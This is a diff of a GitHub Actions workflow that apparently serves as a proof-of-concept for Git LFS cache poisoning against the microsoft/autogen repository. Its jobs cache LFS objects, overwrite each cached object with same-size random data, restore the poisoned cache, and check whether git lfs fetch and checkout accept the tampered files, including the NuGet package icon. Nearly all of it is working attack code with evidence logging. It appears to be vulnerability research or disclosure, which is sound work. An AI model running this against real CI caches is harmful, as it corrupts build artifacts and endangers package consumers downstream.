@@ -9,136 +9,144 @@ jobs:
   baseline:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          lfs: true
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
 
-      - name: Record baseline image hashes
-        run: |
-          mkdir -p evidence
-          echo "=== BASELINE: LFS image integrity ==="
-          echo "Autogen tracks *.png/*.jpg/*.jpeg via LFS"
-          echo ""
-          echo "LFS files:"
-          git lfs ls-files | head -20
-          echo ""
-          echo "=== Baseline SHA-256 hashes of key images ==="
-          for img in $(find . -name '*.png' -o -name '*.jpg' -o -name '*.jpeg' | head -5); do
+    - name: Fetch LFS objects to local store (skip smudge)
+      env:
+        GIT_LFS_SKIP_SMUDGE: "1"
+      run: |
+        mkdir -p evidence
+        git lfs install --local
+        git lfs fetch origin 2>&1 | tee evidence/baseline-lfs-fetch.txt
+        echo ""
+        echo "=== LFS objects in .git/lfs/objects ==="
+        find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-cache-baseline.txt
+        echo "Count: $(find .git/lfs/objects -type f 2>/dev/null | wc -l)"
+        echo ""
+        echo "=== LFS tracked files ==="
+        git lfs ls-files 2>/dev/null | head -20 | tee evidence/lfs-ls-files.txt
+
+    - name: Record baseline hashes
+      run: |
+        mkdir -p evidence
+        git lfs checkout 2>/dev/null || true
+        echo "=== Baseline SHA-256 hashes of LFS images ==="
+        for img in $(git lfs ls-files 2>/dev/null | awk '{print $2}' | head -10); do
+          if [ -f "$img" ]; then
             SHA=$(sha256sum "$img" 2>/dev/null | awk '{print $1}')
             echo "  $img: $SHA"
             echo "$img $SHA" >> evidence/baseline-hashes.txt
-          done
-          echo ""
-          echo "=== LFS cache manifest ==="
-          find .git/lfs/objects -type f | sort > evidence/lfs-cache-baseline.txt 2>/dev/null || true
-          cat evidence/lfs-cache-baseline.txt | head -20
+          fi
+        done
 
-      - name: Save LFS cache
-        uses: actions/cache/save@v4
-        with:
-          path: .git/lfs
-          key: autogen-lfs-poison-${{ github.run_id }}-baseline
+    - name: Save LFS cache
+      uses: actions/cache/save@v4
+      with:
+        path: .git/lfs
+        key: autogen-lfs-poison-${{ github.run_id }}-baseline
 
-      - name: Upload baseline evidence
-        uses: actions/upload-artifact@v4
-        with:
-          name: baseline-${{ github.run_id }}
-          path: evidence/
-          retention-days: 90
+    - name: Upload baseline evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: baseline-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
 
   poison:
     needs: baseline
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          lfs: false
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
 
-      - name: Restore LFS cache from baseline
-        uses: actions/cache/restore@v4
-        with:
-          path: .git/lfs
-          key: autogen-lfs-poison-${{ github.run_id }}-baseline
+    - name: Restore LFS cache from baseline
+      uses: actions/cache/restore@v4
+      with:
+        path: .git/lfs
+        key: autogen-lfs-poison-${{ github.run_id }}-baseline
 
-      - name: Poison LFS cache objects (same size, different sha256)
-        run: |
-          mkdir -p evidence
-          echo "=== POISONING LFS CACHE ==="
-          echo "Autogen's LFS images are used in docs, tests, and NuGet package icon."
-          echo "A poisoned image could inject malicious content into documentation"
-          echo "or replace the NuGet package icon with a phishing image."
-          echo ""
-          COUNT=0
-          find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
-            ORIGINAL_SIZE=$(stat -c%s "$obj")
-            ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
-            dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
-            POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
-            echo "$obj original=$ORIGINAL_SHA poison=$POISON_SHA size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
-            COUNT=$((COUNT+1))
-          done
-          echo "Poisoned $(wc -l < evidence/poison-manifest.txt 2>/dev/null || echo 0) LFS objects"
-          echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
+    - name: Verify cache restore + poison LFS objects
+      run: |
+        mkdir -p evidence
+        echo "=== .git/lfs/objects after cache restore ==="
+        find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-after-restore.txt
+        RESTORED_COUNT=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
+        echo "Restored object count: $RESTORED_COUNT"
+        echo ""
+        echo "=== POISONING LFS CACHE ==="
+        POISON_COUNT=0
+        find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+          ORIGINAL_SIZE=$(stat -c%s "$obj")
+          ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
+          POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          echo "$obj original=$ORIGINAL_SHA poison=$POISON_SHA size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
+          POISON_COUNT=$((POISON_COUNT+1))
+        done
+        echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
+        echo "poisoned_count=$(wc -l < evidence/poison-manifest.txt 2>/dev/null || echo 0)" >> evidence/poison-manifest.txt
 
-      - name: Save poisoned LFS cache
-        uses: actions/cache/save@v4
-        with:
-          path: .git/lfs
-          key: autogen-lfs-poison-${{ github.run_id }}-poison
+    - name: Save poisoned LFS cache
+      uses: actions/cache/save@v4
+      with:
+        path: .git/lfs
+        key: autogen-lfs-poison-${{ github.run_id }}-poison
 
-      - name: Upload poison evidence
-        uses: actions/upload-artifact@v4
-        with:
-          name: poison-${{ github.run_id }}
-          path: evidence/
-          retention-days: 90
+    - name: Upload poison evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: poison-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
 
   attack:
     needs: poison
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-        with:
-          lfs: false
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
 
-      - name: Restore poisoned LFS cache
-        uses: actions/cache/restore@v4
-        with:
-          path: .git/lfs
-          key: autogen-lfs-poison-${{ github.run_id }}-poison
+    - name: Restore poisoned LFS cache
+      uses: actions/cache/restore@v4
+      with:
+        path: .git/lfs
+        key: autogen-lfs-poison-${{ github.run_id }}-poison
 
-      - name: Run git lfs fetch + checkout (consume poisoned cache)
-        continue-on-error: true
-        run: |
-          mkdir -p evidence
-          git lfs install --local 2>&1 | tee evidence/lfs-install.txt
-          echo "lfs_install_rc=$?" >> evidence/lfs-install-rc.txt
-          echo ""
-          echo "=== .git/lfs/objects BEFORE fetch (from cache restore) ==="
-          OBJ_COUNT=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
-          echo "Object count: $OBJ_COUNT"
-          find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-before.txt
-          echo ""
-          echo "=== Running git lfs fetch (key: git-lfs skips download for existing objects via size match) ==="
-          git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt || true
-          echo "lfs_fetch_rc=$?" >> evidence/lfs-fetch-rc.txt
-          echo ""
-          echo "=== .git/lfs/objects AFTER fetch ==="
-          OBJ_COUNT2=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
-          echo "Object count: $OBJ_COUNT2"
-          find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-after-fetch.txt
-          echo ""
-          echo "=== Running git lfs checkout ==="
-          git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt || true
-          echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
+    - name: Verify poisoned cache + fetch + checkout
+      continue-on-error: true
+      run: |
+        mkdir -p evidence
+        git lfs install --local 2>&1 | tee evidence/lfs-install.txt
+        echo ""
+        echo "=== .git/lfs/objects BEFORE fetch (from poisoned cache) ==="
+        OBJ_COUNT=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
+        echo "Poisoned object count: $OBJ_COUNT"
+        find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-before.txt
+        echo ""
+        echo "=== Running git lfs fetch (should skip existing objects - THE BUG) ==="
+        git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt || true
+        echo "lfs_fetch_rc=$?" >> evidence/lfs-fetch-rc.txt
+        echo ""
+        echo "=== .git/lfs/objects AFTER fetch ==="
+        OBJ_COUNT2=$(find .git/lfs/objects -type f 2>/dev/null | wc -l)
+        echo "Object count after fetch: $OBJ_COUNT2"
+        echo ""
+        echo "=== Running git lfs checkout ==="
+        git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt || true
+        echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
 
-      - name: V2 - Integrity guarantee check on autogen images
-        run: |
-          mkdir -p evidence
-          echo "=== V2: Integrity Guarantee Test ==="
-          MISMATCH_COUNT=0
-          OK_COUNT=0
-          for img in $(find . -type f \( -name '*.png' -o -name '*.jpg' -o -name '*.jpeg' \) 2>/dev/null | head -20); do
+    - name: V2 - Integrity guarantee check
+      run: |
+        mkdir -p evidence
+        echo "=== V2: Integrity Guarantee Test ==="
+        MISMATCH_COUNT=0
+        OK_COUNT=0
+        for img in $(git lfs ls-files 2>/dev/null | awk '{print $2}' | head -20); do
+          if [ -f "$img" ]; then
             POINTER_OID=$(git cat-file -p "HEAD:$img" 2>/dev/null | grep 'oid sha256:' | awk '{print $3}')
             if [ -n "$POINTER_OID" ]; then
               ACTUAL_SHA=$(sha256sum "$img" 2>/dev/null | awk '{print $1}')
@@ -146,46 +154,42 @@ jobs:
                 echo "MISMATCH: $img expected_oid=$POINTER_OID actual_sha256=$ACTUAL_SHA" >> evidence/v2-integrity.json
                 MISMATCH_COUNT=$((MISMATCH_COUNT+1))
               else
-                echo "OK: $img" >> evidence/v2-ok.json
+                echo "OK: $img oid=$POINTER_OID" >> evidence/v2-ok.json
                 OK_COUNT=$((OK_COUNT+1))
               fi
             fi
-          done
-          echo ""
-          echo "Mismatches: $MISMATCH_COUNT, OK: $OK_COUNT"
-          cat evidence/v2-integrity.json 2>/dev/null | head -10
-          echo ""
-          LFS_RC=$(grep -o '[0-9]' evidence/lfs-checkout-rc.txt 2>/dev/null | tail -1)
-          echo "git lfs checkout exit code: $LFS_RC"
-          echo "lfs_checkout_rc=$LFS_RC mismatches=$MISMATCH_COUNT ok=$OK_COUNT" >> evidence/v2-integrity.json
+          fi
+        done
+        echo ""
+        echo "Mismatches: $MISMATCH_COUNT, OK: $OK_COUNT"
+        LFS_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null | grep -o '[0-9]' | tail -1)
+        echo "git lfs checkout exit code: $LFS_RC"
+        echo "lfs_checkout_rc=$LFS_RC mismatches=$MISMATCH_COUNT ok=$OK_COUNT" >> evidence/v2-integrity.json
 
-      - name: V5 - Supply chain boundary check (NuGet icon)
-        run: |
-          mkdir -p evidence
-          echo "=== V5: Supply Chain Boundary Test ==="
-          echo "dotnet/nuget/icon.png is the NuGet package icon."
-          echo "If poisoned, it could be used in phishing attacks against package consumers."
-          ICON_SHA=$(sha256sum dotnet/nuget/icon.png 2>/dev/null | awk '{print $1}')
-          echo "nuget_icon_sha256=$ICON_SHA" >> evidence/v5-nuget-icon.json
-          cat evidence/v5-nuget-icon.json
+    - name: V5 - NuGet icon supply chain check
+      run: |
+        mkdir -p evidence
+        echo "=== V5: NuGet Package Icon Supply Chain Test ==="
+        ICON_SHA=$(sha256sum dotnet/nuget/icon.png 2>/dev/null | awk '{print $1}')
+        echo "nuget_icon_sha256=$ICON_SHA" >> evidence/v5-nuget-icon.json
+        cat evidence/v5-nuget-icon.json
 
-      - name: Collect LFS cache state
-        run: |
-          mkdir -p evidence
-          find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true
+    - name: Collect LFS cache state
+      run: |
+        mkdir -p evidence
+        find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true
 
-      - name: Upload attack evidence
-        uses: actions/upload-artifact@v4
-        with:
-          name: attack-${{ github.run_id }}
-          path: evidence/
-          retention-days: 90
+    - name: Upload attack evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: attack-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
 
-      - name: Print verdict
-        run: |
-          echo "## LFS Cache Poisoning Verdict - microsoft/autogen" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          V2=$(cat evidence/v2-integrity.json 2>/dev/null | head -5)
-          echo "V2 Integrity: $V2" >> $GITHUB_STEP_SUMMARY
-          ICON=$(cat evidence/v5-nuget-icon.json 2>/dev/null)
-          echo "NuGet Icon: $ICON" >> $GITHUB_STEP_SUMMARY
+    - name: Print verdict
+      run: |
+        echo "## LFS Cache Poisoning Verdict - microsoft/autogen" >> $GITHUB_STEP_SUMMARY
+        V2=$(cat evidence/v2-integrity.json 2>/dev/null | head -5)
+        echo "V2 Integrity: $V2" >> $GITHUB_STEP_SUMMARY
+        ICON=$(cat evidence/v5-nuget-icon.json 2>/dev/null)
+        echo "NuGet Icon: $ICON" >> $GITHUB_STEP_SUMMARY
